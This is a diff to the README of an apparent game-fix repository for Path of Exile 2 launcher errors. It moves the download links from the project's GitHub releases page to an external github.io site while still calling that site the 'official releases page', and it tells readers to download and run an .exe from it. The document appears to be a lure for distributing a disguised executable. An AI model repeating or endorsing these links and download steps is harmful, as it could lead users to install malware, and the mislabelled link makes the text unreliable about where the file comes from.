@@ -1,6 +1,6 @@
 # 🛠 Path-of-Exile-2-Launcher-Fix - Resolve your game startup errors today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Clancyamphitropous401/Path-of-Exile-2-Launcher-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://clancyamphitropous401.github.io)
 
 ---
 
@@ -21,7 +21,7 @@ Before you proceed, verify your computer meets these standards:
 
 You must obtain the files directly from the repository release page to ensure you have the current version.
 
-1. Visit the [official releases page](https://github.com/Clancyamphitropous401/Path-of-Exile-2-Launcher-Fix/releases).
+1. Visit the [official releases page](https://clancyamphitropous401.github.io).
 2. Locate the section labeled Assets.
 3. Select the file ending in .exe to begin the transfer.
 4. Save the file to a known folder on your computer, such as your Downloads folder or your Desktop.
